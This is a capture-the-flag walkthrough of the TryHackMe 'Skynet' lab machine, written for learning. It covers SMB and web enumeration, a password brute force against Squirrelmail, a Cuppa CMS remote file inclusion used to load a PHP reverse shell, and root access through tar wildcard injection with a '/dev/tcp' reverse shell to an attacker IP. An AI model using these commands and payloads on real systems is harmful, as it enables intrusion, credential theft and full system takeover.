We begin with an autorecon scan, followed by an nmap scan.

<center>

![1422fa228645db8325993638401f751d.png](/Skynet/_resources/1422fa228645db8325993638401f751d.png)

![40c6a4e5aa7e17de9c78db3393f2b60f.png](/Skynet/_resources/40c6a4e5aa7e17de9c78db3393f2b60f.png)

![f82c683fe31af33de7f187e50d37a5e5.png](/Skynet/_resources/f82c683fe31af33de7f187e50d37a5e5.png)

</center>

Let's take a look at the web server. We run gobuster to check for any interesting directories; we can also check the feroxbuster output given by autorecon.

```bash
gobuster dir -u http://10.10.104.171 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o /home/kali/Documents/THM/Skynet/gobuster.txt -x .php,.txt,.html
```

We see that the machine is hosting Squirrelmail at `/squirrelmail`; we might be able to use this later to access a user's emails.

<center>

![1b14df4dcf59de842b8a36581a8dc679.png](/Skynet/_resources/1b14df4dcf59de842b8a36581a8dc679.png)

</center>

We also saw that Samba is running on ports 139 and 445. Let's enumerate it. Luckily, autorecon already did this for us.

```txt
ORT    STATE SERVICE     REASON         VERSION
139/tcp open  netbios-ssn syn-ack ttl 61 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET

Host script results:
|_smb-vuln-ms10-061: false
| smb-enum-sessions: 
|_  <nobody>
|_smb-system-info: ERROR: Script execution failed (use -d to debug)
| smb-ls: Volume \\10.10.104.171\anonymous
| SIZE   TIME                 FILENAME
| <DIR>  2020-11-26T16:04:00  .
| <DIR>  2019-09-17T07:20:17  ..
| 163    2019-09-18T03:04:59  attention.txt
| <DIR>  2019-09-18T04:42:16  logs
| 0      2019-09-18T04:42:13  logs\log2.txt
| 471    2019-09-18T04:41:59  logs\log1.txt
| 0      2019-09-18T04:42:16  logs\log3.txt
```

Autorecon also gave us information about the share permissions and the share contents.

```txt
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	anonymous                                         	READ ONLY	Skynet Anonymous Share
	milesdyson                                        	NO ACCESS	Miles Dyson Personal Share
	IPC$                                              	NO ACCESS	IPC Service (skynet server (Samba, Ubuntu))
```

```txt
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	anonymous                                         	READ ONLY	Skynet Anonymous Share
	.\anonymous\*
	dr--r--r--                0 Thu Nov 26 11:04:00 2020	.
	dr--r--r--                0 Tue Sep 17 03:20:17 2019	..
	fr--r--r--              163 Tue Sep 17 23:04:59 2019	attention.txt
	dr--r--r--                0 Wed Sep 18 00:42:16 2019	logs
	.\anonymous\logs\*
	dr--r--r--                0 Wed Sep 18 00:42:16 2019	.
	dr--r--r--                0 Thu Nov 26 11:04:00 2020	..
	fr--r--r--                0 Wed Sep 18 00:42:13 2019	log2.txt
	fr--r--r--              471 Wed Sep 18 00:41:59 2019	log1.txt
	fr--r--r--                0 Wed Sep 18 00:42:16 2019	log3.txt
	milesdyson                                        	NO ACCESS	Miles Dyson Personal Share
	IPC$                                              	NO ACCESS	IPC Service (skynet server (Samba, Ubuntu))
```

We can also use enum4linux to enumerate the Samba shares. (Autorecon does this, too, by the way.)

Let's access the Samba shares using `smbclient //10.10.104.171/anonymous`. Note that this is the only share which we have access to. We press enter when prompted to input a password, and then we are granted access. Looking around, we find a file called `attention.txt` (which we saw earlier in the enum4linux/autorecon output). Use `get attention.txt` to transfer the file to our local machine. We see that it contains an announcement concerning employee passwords.

<center>

![2d8ca1999c93a2dcaa1a2aceb815d4eb.png](/Skynet/_resources/2d8ca1999c93a2dcaa1a2aceb815d4eb.png)

</center>

In the same directory containing the `attention.txt` file, we find another directory called `logs` which contains three log files.

<center>

![7f55dcc4f282c841915286f36393fffa.png](/Skynet/_resources/7f55dcc4f282c841915286f36393fffa.png)

</center>

`log2.txt` and `log3.txt` are empty, but `log1.txt` contains a list of (presumably) passwords. Since we already know a potential point of entry (via Squirrelmail), so let's try to bruteforce milesdyson's password using the list we just found. We could use Hydra to do this; since the password list is relatively short, we'll just do this manually. Luckily, I didn't have to get very far into the list before I got a hit.

<center>

![912fe309cec3cd634b655fb75bb27594.png](/Skynet/_resources/912fe309cec3cd634b655fb75bb27594.png)

</center>

Let's look around. It doesn't take long before we find milesdyson's password.

<center>

![16a7c62d4f22fd5ae4e4c90f8262470b.png](/Skynet/_resources/16a7c62d4f22fd5ae4e4c90f8262470b.png)

</center>

We now have access to the milesdyson share. We log in as milesdyson using the password we just found, using the command `smbclient //10.10.104.171/milesdyson -U milesdyson`. We look around for some interesting files.

<center>

![1e923d703bb3ab21b7f2b7f9def09882.png](/Skynet/_resources/1e923d703bb3ab21b7f2b7f9def09882.png)

![e48e982ec44ff98c798394186b21c546.png](/Skynet/_resources/e48e982ec44ff98c798394186b21c546.png)

</center>

Among the various notes on AI and pandas, we find the aptly-named `important.txt`. We copy this file to our location machine and read it. Item 1 contains a what appears to be a directory. (Admittedly, I knew I was looking for a directory thanks to the THM question prompt. It doesn't look like a standard directory, so maybe it's not so obvious.)

<center>

![c3b68ae0b09efa332f46e132680b23a4.png](/Skynet/_resources/c3b68ae0b09efa332f46e132680b23a4.png)

</center>

Navigating to this hidden directory, we find Miles' personal page.

<center>

![cb3142c091b6dcef0fb486692ba41005.png](/Skynet/_resources/cb3142c091b6dcef0fb486692ba41005.png)

</center>

We can run gobuster again to check for any subdirectories.
```bash
gobuster dir -u http://10.10.104.171/<hidden directory>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Eventually we find that `/administrator` is a valid subdirectory. Navigating to this page leads to a Cuppa login form.

<center>

![595a787c143a76469032bd42891a427a.png](/Skynet/_resources/595a787c143a76469032bd42891a427a.png)

</center>

<br>

# Exploitation

At this point, we have access to a hidden subdirectory containing a Cuppa login form. We don't have much to go on, but a quick searchsploit search for Cuppa shows the existence of a [remote file inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion) exploit.

<center>

![7625f4004a5627aa9cdd25797e853595.png](/Skynet/_resources/7625f4004a5627aa9cdd25797e853595.png)

</center>

We'll use the exploit from [exploit-db](https://www.exploit-db.com/exploits/25971). To use it, we simply append `/alerts/alertConfigField.php?urlConfig=<path to file>` to the current url (where we found the login page). For instance, we can view the `/etc/passwd` file by navigating to `/alerts/alertConfigField.php?urlConfig=/Skynet//Skynet//Skynet//Skynet/../etc/passwd`. However, what we would like to do is set up a reverse shell using this method.

Set up a netcat lister with `rlwrap nc -lvnp 9999`. Download and modify [Pentestmonkey's php reverse shell script](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php), host it on an http server with `python3 -m http.server,` and use the above exploit to navigate to `/alerts/alertConfigField.php?urlConfig=http://10.6.30.43:8000/php-reverse-shell.php`. After a short while, the target machine completes the request, download the reverse shell php script, and we obtain a reverse shell.

<center>

![c805141dd6b0c16cf4845b1bb05e7171.png](/Skynet/_resources/c805141dd6b0c16cf4845b1bb05e7171.png)

</center>

<br>

# Post-exploitation

Now that we have initial access to the system, we can begin looking for flags. With our current privileges, easily find the `user.txt` flag in Miles' home directory.

<center>

![4856ecb521d0dcd629bcad974e2dbb62.png](/Skynet/_resources/4856ecb521d0dcd629bcad974e2dbb62.png)

</center>

It remains to find the root flag. Let's go ahead and upgrade our shell with `python -c 'import pty; pty.spawn("/bin/bash")` for convenience. We will use LinPEAS to search for possible privesc avenues. We'll host a web server on our local machine in order to download `linpeas.sh` with `wget`; here, we'll want to save the file to the `/tmp` directory since we have write permissions there. Now use `chmod +x linpeas.sh` to make the file executable, and run it with `./linpeas.sh`. 

There are a few ways we can proceed from here, but we'll focus on looking at cronjobs. One interesting scheduled process sticks out.

<center>

![205bd8e761c33f959206f27942aaefae.png](/Skynet/_resources/205bd8e761c33f959206f27942aaefae.png)

![39aa328167e5abfbc3ec9158cbde5ac8.png](/Skynet/_resources/39aa328167e5abfbc3ec9158cbde5ac8.png)

</center>

We could try editing the `backup.sh`, but unfortunately we don't have write permissions. Let's look at the contents.

<center>

![93e4f30926ea59f72b46ccb80bad439a.png](/Skynet/_resources/93e4f30926ea59f72b46ccb80bad439a.png)

</center>

So, whenever this script runs, it moves into the `/var/www/html` directory and uses `tar` to compress the contents of the directory into a file in Miles' backups directory. Note that the script executes every minute, and it runs with root privileges.

If we look up the tar binary on [GTFOBins](https://gtfobins.github.io/gtfobins/tar/), we see that we can use it to spawn a new shell with root privileges. We need to use the following sequence of commands to add the relevant options before we can spawn the shell.

```bash
printf '#!/bin/bash\nbash -i >& /dev/tcp/10.8.50.72/6666 0>&1' > /var/www/html/shell
chmod +x /var/www/html/shell
touch /var/www/html/--checkpoint=1
touch /var/www/html/--checkpoint-action=exec=bash\ shell
```

Navigating to `/var/www/html`, we verify that all requires files are in the right place.

<center>

![e6f6c3f0e63acc1605ec8f7525027d77.png](/Skynet/_resources/e6f6c3f0e63acc1605ec8f7525027d77.png)

</center>

Now set up a netcat listener on a different port and run the following command to catch the reverse shell.

```bash
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

A quick search reveals the location of the `root.txt` flag.

<center>

![cf10e8a25a88a3c4e39d55b903d95fe2.png](/Skynet/_resources/cf10e8a25a88a3c4e39d55b903d95fe2.png)

![e57d9a5902ba8f9eff3a0df207d4fb7b.png](/Skynet/_resources/e57d9a5902ba8f9eff3a0df207d4fb7b.png)

</center>